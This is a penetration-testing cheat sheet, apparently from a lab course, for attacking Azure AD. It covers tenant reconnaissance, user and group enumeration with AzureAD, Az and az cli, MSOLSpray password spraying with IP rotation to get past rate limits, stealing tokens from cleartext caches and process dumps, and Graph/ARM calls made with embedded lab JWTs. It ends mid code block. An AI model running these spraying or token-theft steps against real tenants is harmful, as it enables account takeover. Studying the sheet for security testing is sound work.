---
author: Charlie T
title: Azure AD Cheat Sheet 
date: 2024-03-11
description: A cheat sheet for Azure AD by ElevateCyber
math: false
tags:
  - azure
---
**This is a Cheat Sheet by ElevateCyber**
## Manual
### Get if Azure tenant is in use
- Tenant name and Federation
- Navigate to the following URL
`https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1`

### Get the tenant ID
- Navigate to the following URL
`https://login.microsoftonline.com/[DOMAIN]/.well-known/openid-configuration`

### Validate email ID 
- Send requests to
`https://login.microsoftonline.com/common/GetCredentialType`


## AADInternals
https://github.com/Gerenios/AADInternals 

`Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose`

### Get tenant name, authentication, brand name, and domain name
- The brand name is usually the same as the directory name

`Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com`

### Get tenant ID
`Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com`

### Get all the information
`Invoke-AADIntReconAsOutsider -DomainName defcorphq.onmicrosoft.com`


## o365creeper
### Validate email IDs
- Python2 tool
`C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt`

Demo emails.txt file
```
admin@defcorphq.onmicrosoft.com
root@defcorphq.onmicrosoft.com
test@defcorphq.onmicrosoft.com
contact@defcorphq.onmicrosoft.com
```

## MicroBurst
- Azure services are available at specific domains and subdomains. We can enumerate if the target organization is using any of the services by looking for such subdomains.
https://github.com/NetSPI/MicroBurst

`Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose`

### Enumerate all subdomains for an organization
`Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose`


## MSOLSpray
- Used for conducting password spray attacks against Azure
- Noisy

https://github.com/dafthack/MSOLSpray

- The tool supports fireprox to rotate source IP address on auth request (bypass rate limiting restrictions imposed by Microsoft): https://github.com/ustayready/fireprox

### Password Spray
`Import-Module C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1`
`Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPassword@1234 -Verbose`

validemails.txt (from the lab)
```
admin@defcorphq.onmicrosoft.com
test@defcorphq.onmicrosoft.com
```

## Azure Portal
- The GUI alternative to tools like PowerShell modules and Azure cli.

https://portal.azure.com/ 


## AzureAD (PowerShell module)
Install
`Install-Module AzureAD`
OR 
Download it from PowerShell Galery: https://www.powershellgallery.com/packages/AzureAD 
- Rename the .nukpkg to .zip and extact it

`Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1`

### Connect to Azure AD
- To be able to use this module, we must connect to Azure AD first
`Connect-AzureAD`
OR
Use credentials from Command line
```powershell
$creds = Get-Credential
Connect-AzureAD -Credential $creds
```
OR
PSCredential object can be used too
```powershell
$passwd = ConvertTo-SecureString "SuperStrOngMad4rA@Uch!H4" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredentials("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
```

### Get the current session state
`Get-AzureADCurrentSessionInfo`

### Get details of the current tenant
`Get-AzureADTenantDetail`

### Enumerate all users
`Get-AzureADUser -All $true`

### Enumerate a specific user
`Get-AzureADUser -ObjectID test@defcorphq.onmicrosoft.com`

### Search for user based on string in first characters of DisplayName or userPrincipalName
- Wildcard not supported
`Get-AzureADUser -SearchString "admin"`

### Search for users that contain the word "admin" in their Display name:
`Get-AzureADUser -All $true |?{$_.Displayname -match "admin"}`
- Can adapt this to whatever else you want to serach for

### List all the attributes for a user
`Get-AzureADUser -ObjectID test@defcorphq.onmicrosoft.com |fl *`

`Get-AzureADUser -ObjectID test@defcorphq.onmicrosoft.com |%{$_.PSObject.Properties.Name}`

### Search attributes of all users that contain the string "password"
`Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name |% {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}`

### All users who are synced from on-prem
`Get-AzureADUser -All $true |?{$_.OnPremisesSecurityIdentifier -ne $null}`

### All users who are from Azure AD
`Get-AzureADUser -All $true |?{$_.OnPremisesSecurityIdentifier -eq $null}`

### Objects created by any user 
- Use `-ObjectId` for a specific user
`Get-AzureADUser | Get-AzureADUserCreatedObject`

### Objects owned by a specific user
`Get-AzureADUserOwnedObject -ObjectId test@defcorphq.onmicrosoft.com`

### List all groups
`Get-AzureADGroup -All $true`
- Lists all of the ObjectIds as well

### Enumerate a specific group
`Get-AzureADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e`

### Search for a group based on string in first characters of DisplayName
- Wildcard not supported
`Get-AzureADGroup -SearchString "admin" |fl *`

### Search for groups which contain the word "admin" in their name
`Get-AzureADGroup -All $true |?{$_.DisplayName -match "admin"`
- Can adapt this to search for others

### Get groups that allow Dynamic membership
- Note the cmdlet name
`Get-AzureADMSGroup |?{$_.GroupTypes -eq 'DynamicMembership'}`

### Get all groups that are synced from on-prem
- Note that security groups are not synced
`Get-AzureADGroup -All $true |?{$_.OnPremisesSecurityIdentifier -ne $null}`

### Get all groups that are from Azure AD
`Get-AzureADGroup -All $true |?{$_.OnPremisesSecurityIdentifier -eq $null}`

### Get members of a group
`Get-AzureADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e`

### Get groups and roles where the specified user is a member
`Get-AzureADUser -SearchString 'test' |Get-AzureADUserMembership`

`Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com`

### Get all available role templates
`Get-AzureADDirectoryroleTemplate`

### Get all enabled roles
- A user is assigned the role at least once
`Get-AzureADDirectoryRole`

### Enumerate users to whom roles are assigned
`Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" |Get-AzureADDirectoryRoleMember`

### Get all Azure joined and registered devices
`Get-AzureADDevice -All $true |fl *`

### Get the device configuration object 
- Note the RegistrationQuota in the output
`Get-AzureADDeviceConfiguration |fl *`

### List registered owners of all the devices
`Get-AzureADDevice -All $true |Get-AzureADDeviceRegisteredOwner`

### List registered users of all the devices
`Get-AzureADDevice -All $true |Get-AzureADDeviceRegisteredUser`

### List devices owned by a user
`Get-AzureADUserOwnedDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com`

### List devices registered by a user
`Get-AzureADUserRegisteredDevice -ObjectId micahelmbarron@defcorphq.onmicrosoft.com`

### List devices managed using Intune
`Get-AzureADDevice -All $true |?{$_.IsComplaint -eq "True"}`

### Get all the application objects registered with the current tenant
- These are visible in App Registrations in Azure Portal
- An application object is the global representation of an app
`Get-AzureADApplication -All $true`

### Get all details about an application
`Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0`

### Get an application based on the display name
`Get-AzureADApplication -All $true |?{$_.DisplayName -match "app"}`
- The `Get-AzureADApplicationPasswordCredential` will show the applications with an application password but the value is not shown

### Get the owner of an application
`Get-AzureADApplicaiton -ObjectId a1333e88-1278-41bf-8145-155a069ebed0 |Get-AzureADApplicationOwner |fl *`

### Get Apps where a user has a role
- The exact role is not shown
`Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com |Get-AzureADUserAppRoleAssignment |fl *`

### Get Apps where a group has a role
- The exact role is not shown
`Get-AzureADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e |Get-AzureADGroupAppRoleAssignment |fl *`

### Enumerate Service Principals
- These are visible as Enterprise Applications in Azure Portal
- Service principal is the local representation for an app in a specific tenant and it is the security object that has privileges. 
- This is the 'service account'
- Service principals can be assigned Azure roles

### Get all service principals
`Get-AzureADServicePrincipal -All $true`

### Get all details about a service principal
`Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 |fl *`

### Get a service principal based on the display name
`Get-AzureADServicePrinciapal -All $true |?{$_.DisplayName -match "app"}`

### Get owner of a service principal
`Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 |Get-AzureADServicePrincipalOwner |fl *`

### Get objects owned by a service principal
`Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 |Get-AzureADServicePrincipalOwnedObject`

### Get objects created by a service principal
`Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 |Get-AzureADServicePrincipalCreatedObject`

### Get group and role memberships of a service principal
`Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 |Get-AzureADServicePrincipalMembership |fl *`

`Get-AzureADServicePrincipal |Get-AzureADServicePrincipalMembership`

### Use the AAD Graph token
`Connect-AzureAD -AccountId test@defcorphq.onmicrosoft.com -AadAccessToken eyj0eXA...`
- AzureAD module cannot request a token but can use one for AADGraph or Microsoft Graph

## Az (PowerShell module)
Install 
`Install-Module Az`
- This commands requires an internet connection

- To be able to use this module, we must connect to Azure AD first
`Connect-AzAccount`
OR
Use credentials from command line
```powershell
$creds = Get-Credential
Connect-AzAccount -Credential $creds
```
OR
PSCredential object and access tokens can be used too
```powershell
$passwd = ConverTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
```

- Az Powershell can enumerate both Azure AD and Azure Resources

-All the Azure AD cmdlets have the format `*-AzAD*`
`Get-Command *azad*`
`Get-AzADUser`
- Cmdlets for other Azure resources ahve the format `*Az*`

Find cmdlets fora  particular resource. 
e.g. VMs
`Get-Command *azvm*`
`Get-Command -Noun *vm* -Verb Get`
`Get-Command *vm*`

### Get the information about the current context 
- Account, Tenant, Subscription, etc.
`Get-AzContext`

### List all available contexts
`Get-AzContext -ListAvailable`

### Enumerate subscriptions accessible by the current user
`Get-AzSubscription`

### Enumerate all resources visible to the current user
`Get-AzResource`
- Equivalent to 'whoami'

### Enumerate all Azure RBAC role assignments
`Get-AzRoleAssignment`
OR
` Get-AzRoleAssignment -SignInName samcgray@defcorphq.onmicrosoft.com`
- Equivalent to 'whoami'

### Enumerate all users
`Get-AzADUser`

### Enumerate a specific user
`Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com`

### Search for a user based on string in first cahracters of DisplayName 
- Wildcard not supported
`Get-AzADUser -SearchString "admin"`

### Search for users who contain the word "admin" in their Display name:
`Get-AzADUser |?{$_.Displayname -match "admin"}`

### List all groups
`Get-AzADGroup`

### Enumerate a specific group
`Get-AzADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e`

### Search for a group based on string in first characters of DisplayName
`Get-AzADGroup -SearchString "admin" |fl *`

### Search for groups which contain the word "admin" in their name
`Get-AzADGroup |?{$_.Displayname -match "admin"}`

### Get members of a group
`Get-AzADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e`

### Get all the application objects registered with the current tenant
- Visible in App Registrations in Azure Portal
- An application object is the global representation of an app
`Get-AzADApplication`

### Get all details about an application
`Get-AzADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0`

### Get an application based on the display name
`Get-AzADAppCredential |?{$_.DisplayName -match "app"}`

- The `Get-AzADAppCredential` will show the applications with an application password but the value is not shown

### Enumerate Service Principals
- Visible as Enterprise Applications in Azure Portal
- Service principal is the local representation for an app in a specific tenant and it is the security objefct that has privileges
- This is the 'service account'
- Service principals can be assigned Azure roles

### Get all service principals
`Get-AzADServicePrincipal`

### Get all details about a service principal
`Get-AzADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264`

### Get a service principal based on the display name
`Get-AzADServicePrincipal |?{$_.DisplayName -match "app"}`

### Request access token for resource manager (ARM)
`Get-AzAccessToken`

`(Get-AzAccessToken).Token`
- Requires that you are already connected to a tenant

### Request an access token for AAD Graph to access Azure AD
`Get-AzAccessToken -ResourceTypeName AadGraph`
- Supported tokens: AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, OperationalInsights, ResourceManager, Synapse

`(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token`

### Using tokens with CLI tools
`Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken eyJ0eXA...`

### Use other access tokens
`Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken eyJ0eXA... -GraphAccessToken eyJ0eXA...`
- Use the one for AAD Graph (access token is still required) for accessing Azure AD

### Stealing tokens from Az PowerShell
- Older versions store access tokens in clear text in TokenCache.dat in the directory: `C:\Users\[usernmae]\.Azure`
- It also stores ServicePrincipalSecret in clear-text in AzureRmContext.json if a service principal secret is used to authenticate
- Another interesting method is to take a process dump of PowerShell and look for tokens in it
- Users can save tokens using `Save-AzContext`. Look out for them
	- Search for `Save-AzContext` in PowerShell console history
- Always use `Disconnect-AzAccount` when you're done


## Azure CLI (az cli)
Install using MSI: https://docs.microsoft.com/en-us/cli/azure/install-azure-cli

- To be able to use az cli, we must connect to Azure AD first 
	- Opens up a login page using your Default browser
`az login`
OR
Use credentials from the command line
`az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234`
- Service principals and managed identity for VMs is also supported

If the user has no permissions on the subscription
`az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234 --allow-no-subscriptions`

- You can configure az cli to set some default behaviour 
	- output type, location, resource group, etc.
`az configure`

### Find popular commands for VMs
`az find "vm"`
- We can search for popular commands (based on user telemetry) on a particular topic
- We can adapt this command to search for anything we're interested in

### Find popular commands within "az vm"
`az find "az vm"`

### Find popular subcommands and parameters within "az vm list"
`az find "az vm list"`

### List all the users in Azure AD and format output in a table
`az ad user list --output table`
- We can fomrat output using the --ouput parameter. The default format is JSON. This is changeable.

### List only the userPrincipalName and givenName (case sensitive) for all the users in Azure AD and format output in a table
`az ad user list --query "[].[userPrincipalName,displayName]" --output table`
- Az cli uses JMESPath (pronounced 'James Path') query

### List only the userPrincipalName and givenName (case sensitive) for all the users in Azure AD, rename the properties and format output in a table
`az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table`

### We can use JMESPath query on the results of JSON output. Add `--query-examples` at the end of any command to see examples
`az ad user show list --query-examples`

### Get details of the current tenant 
`az account tenant list`
- Uses the account extension

### Get details of the current subscription
`az account subscription list`
- Uses the account extension

### List the current signed-in user
`az ad signed-in-user show`


### Enumerate all users
`az ad user list`

`az ad user list --query "[].[displayName]" -o table`

### Enumerate a specific user
`az ad user show --id test@defcorphq.onmicrosoft.com`
- Lists all attributes

### Search for users who contain the word "admin" in their Display name (case sensitive)
`az ad user list --query "[?contains(displayName,'admin')].displayName"`

### Search for users who contain the word "admin" in their Display name (NOT case sensitive)
`az ad user list |ConvertFrom-Json |%{$_.displayName -match "admin"}`
- Requires PowerShell

### All users that are synced from on-prem
`az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"`

### All users that are from Azure AD
`az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"`

### List all groups
`az ad group list`

`az ad group list --query "[].[displayName]" -o table`

### Enumerate a specific group using display name or object id
`az ad group show -g "VM admins"`

`az ad group show -g 783a312d-0de2-4490-92e4-539b0e4ee03e`

### Search for groups that contain the word "admin" in their Display name (case sensitive)
`az ad group list --query "[?contains(displayName,'admin')].displayName"`
- Run from cmd (not from PowerShell)

### Search for groups that contain the word "admin" in their Display name (NOT case sensitive)
`az ad group list |ConvertFrom-Json |%{$_.displayName -match "admin"}`
- Requires PowerShell

### All groups that are synced from on-prem
`az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"`

### All groups that are from Azure AD
`az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"`

### Get members of a group
`az ad group member list -g "VM Admins" --query "[].[displayName]" -o table`

### Check if a user is a member of the specified group
`az ad group member check --group "VM Admins" --member-id b71d21f6-8e09-4a9d-932a-cb73df519787`

### Get the object IDs of the groups of which the specified group is a member
`az ad group get-member-groups -g "VM Admins"`

### Get all the application objects registered with the current tenant
- Visible in App Registrations in Azure Portal
- An application object is the global representation of an app
`az ad app list`

`az ad app list --query "[].[displayName]" -o table`

### Get all details about an application using identifier uri, application id or object id
`az ad app show --id a1333e88-1278-41bf-8145-155a069ebed0`

### Get an application based on the display name
`az ad app list --query "[?contains(displayName,'app')].displayName"`
- Run from cmd (not from PowerShell)

### Search for apps that contain the word "slack" in their Display name (NOT case sensitive)
`az ad app list |ConvertFrom-Json |%{$_.displayName -match "app"}`
- Requires PowerShell

### Get owner of an application
`az ad app owner list --id --id a1333e88-1278-41bf-8145-155a069ebed0 --query "[].[displayName]" -o table`

### List apps that password credentials
`az ad app list --query "[?passwordCredentials != null].displayName"`

### List apps that have key credentials
`az ad app list --query "[?keyCredentials != null].displayName"`

### Enumerate Service Principals
- Visible as Enterprise Applications in Azure Portal
- Service principal is the local representation of an app in a specific tenant and it is the security object that has privileges
- This is the 'service account'
- Service principals can be assigned Azure roles

### Get all service principals
`az ad sp list --all`

`az ad sp list --all --query "[].[displayName]" -o table`

### Get all details about a service principal using service principal id or object id
`az ad sp show --id cdddd16e-2611-4442-8f45-053e7c37a264`

### Get a service principal based on the display name
`az ad sp list --all --query "[?contains(displayName,'app')].displayName"`

### Search for service principals that contain the word "slack" in their Display name (NOT case sensitive)
`az ad sp list --all |ConvertFrom-Json |%{$_.displayName -match "slack"}`
- Requires PowerShell

### Get owner of a service principal
`az ad sp owner list --id cdddd16e-2611-4442-8f45-053e7c37a264 --query "[].[displayName]" -o table`

### Get service principals owned by the current user
`az ad sp list --show-mine`

### List apps that have password credentials
`az ad sp list --all --query "[?passwordCredentials != null].displayName"`

### List apps that have key credentials
`az ad sp list -all --query "[?keyCredentials != null].displayName"`

### Request an access token (ARM)
`az account get-access-token`
- az cli can request a token but cannot use it

### Request and access token for aad-graph
`az account get-access-token --resource-type ms-graph`
- Supported tokens: aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms

### Stealing tokens from az cli
- az cli stores access tokens in clear text in accesTokens.json in the directory `C:\Users\[username\.Azure`
- azureProfile.json in the same directory contains information about subscriptions
- You can modify accessTokens.json to use access tokens with az cli but it's better to use Az PowerShell or the Azure AD module instead

### Clearing the access tokens
`az logout`
- always run this before logging off

### Checking for automation accounts
`az automation account list`

## Using Tokens with APIs - Management
- The two REST API endopoints that are most widely used are: Azure Resource Manager (management.azure.com) and Microsoft Graph (graph.microsoft.com)
	- There is also Azure AD Graph (graph.windows.net) but it is deprecated

### Get an access token and use it with ARM API
```powershell
$Token = 'eyj0eXAi...'

$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

$RequestParams = @{
	Method	= 'GET'
	Uri		= $URI
	Headers	= @{
		'Authorization' = "Bearer $Token"
	}
}
(Invoke-RestMethod @RequestParams).value
```

### Get and access token for MS Graph
e.g. List all the users
```powershell
$Token = 'eyj0eXAi...'

$URI = 'https://graph.microsoft.com/v1.0/users'

$RequestParams = @{
	Method	= 'GET'
	Uri		= $URI
	Headers	= @{
		'Authorization' = "Bearer $Token"
	}
}
(Invoke-RestMethod @RequestParams).value
```


## REST API
### Use the Azure REST API to get the subscription id
```powershell
PS C:\AzAD\Tools> $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
PS C:\AzAD\Tools> $RequestParams = @{
>> Method = 'GET'
>> Uri = $URI
>> Headers = @{
>> 'Authorization' = "Bearer $token"
>> }
>> }
PS C:\AzAD\Tools> (Invoke-RestMethod @RequestParams).value


id                   : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768
authorizationSource  : RoleBased
managedByTenants     : {}
subscriptionId       : b413826f-108d-4049-8c11-d52d5d388768
tenantId             : 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
displayName          : DefCorp
state                : Enabled
subscriptionPolicies : @{locationPlacementId=Public_2014-09-01; quotaId=PayAsYouGo_2014-09-01; spendingLimit=Off}
```

### List all the resources available by the managed identity to the app service
```powershell
PS C:\AzAD\Tools> $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-01-01'
PS C:\AzAD\Tools> $RequestParams = @{
>> Method = 'GET'
>> Uri = $URI
>> Headers = @{
>> 'Authorization' = "Bearer $token"
>> }
>> }
PS C:\AzAD\Tools> (Invoke-RestMethod @RequestParams).value

id                                                                                                                                                                          name
--                                                                                                                                                                          ----
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Network/networkInterfaces/bkpadconnect368                                bkpadconnect368
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect                                     bkpadconnect
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Network/publicIPAddresses/bkpadconnectIP                                 bkpadconnectIP
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/extensions/MicrosoftMonitoringAgent bkpadconnect/Micros...
```

### Check what actions are allowed to the vm
```powershell
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}

(Invoke-RestMethod @RequestParams).value



actions                                               notActions
-------                                               ----------
{*/read}                                              {}
{Microsoft.Compute/virtualMachines/runCommand/action} {}
```

### View what permissions your managed identity has on a resource
- We adapt the previous command to account for the accessible resource.

```powershell
PS C:\AzAD\Tools> Get-AzResource

Name              : ResearchKeyVault
ResourceGroupName : Research
ResourceType      : Microsoft.KeyVault/vaults
Location          : germanywestcentral
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault
Tags              :


$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

actions  notActions
-------  ----------
{}       {}
{*/read} {}
```

### Connecting with the Graph API
```powershell
PS C:\AzAD\Tools> $token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyIsImtpZCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NTMwNTQxMzgsIm5iZiI6MTY1MzA1NDEzOCwiZXhwIjoxNjUzMTQwODM4LCJhaW8iOiJFMlpnWUloTTkyTHJlRDUxU3BHWTdEWW0zM1dyQUE9PSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRrWklmM2tBdXRkUHVrUGF3ZmoyTUJOd0FBQS4iLCJzdWIiOiJlYTRjM2MxNy04YTVkLTRlMWYtOTU3Ny1iMjlkZmZmMDczMGMiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJpQ3hVaGhRbDVFZUN0UzZrMmJCaEFBIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0lUL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL3Byb2Nlc3NmaWxlIiwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.R8AlKuPkVfPf5t-Astvcmq67NYFxa_NWXSdjibJMjj8-BCOYAK2QxWKC4nPQduZu56wsEnh-25wM64TG5Fjlr7EQ-9r5Tn5YjnhykVP4KK2X0FHtvuo0EZleOuhg1-ASl93UlLTBdtD2xuRh2RrIeiSV5yUiR3SaXOPgqJZ_aPx5-s7KXVFD623yMbN4kwOFqInToUGGWe_Zt75KM8Sgf5ojMLDv8M3TsEHCrm_yzv-OvNlLIj6yEsXNpFAS7fLQZaVHI5nR1k3hEEQfa3S4Tj6-I9c1GOvumqBzF8o9eoJhu6zbzJmR4xlE8I5R-UdSQB-G6A372egfBfi2uivssw'

PS C:\AzAD\Tools> $graphaccesstoken = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6InlSdGhUVVFwZmdLRGpXZUotRDBWWGJZX3JJRGpFUVBPdVJMZmZHQWtWS28iLCJhbGciOiJSUzI1NiIsIng1dCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyIsImtpZCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY1MzA1NDEzOSwibmJmIjoxNjUzMDU0MTM5LCJleHAiOjE2NTMxNDA4MzksImFpbyI6IkUyWmdZRGl5dmRxd3AvVEFyTk1tWVNjL2Z6QitEZ0E9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0Z01BQUFBQUFBQUF3QUFBQUFBQUFBQndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiNEJ3VHN1Unl6MC1NWlY4TlNCTkJBQSIsInZlciI6IjEuMCIsIndpZHMiOlsiMDk5N2ExZDAtMGQxZC00YWNiLWI0MDgtZDVjYTczMTIxZTkwIl0sInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.F-KZhqeaGkyITAHIE49xTe1rCNbQswLYtnkfKr87gPSbAwNhXtRFK_rJNNMCpgYERFW5JHRXaeaZnOqMxDGaerygfR7u8sHq-Z48LONym_6_KYQ4EuiXMvc1Fsr8vpbEy61ofOAuGRNx-yYxMU4c8DL6mPNxzvXAkN7j5OJfoIfl4TAk53GpjqJkQnTS1xXq6g_Fc0vz0X6tfDOuZtVwqIux9FTncVPzXPt0uivCQ0MNwXQIRQG0ONsVrhGl5PVx7zQcQIAhs5TKvUsg3f1ZHRpXiTSYAUg2xhnj40BhBzADpC-ZKXgfRAx9uQA0-yv9CyY8dFtapNwUf5BIB3Gy4g'
```

```powershell
PS C:\AzAD\Tools> Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
62e44426-5c46-4e3c-8a89-f461d5d586f2                  2d50cb29-5f7b-48a4-87ce-fe75a941adb6 AzureCloud
```
Note: Use the GraphAPI client Id as the AccountId

### Calling the Graph REST API
- Set the Graph access token as $Token
```powershell
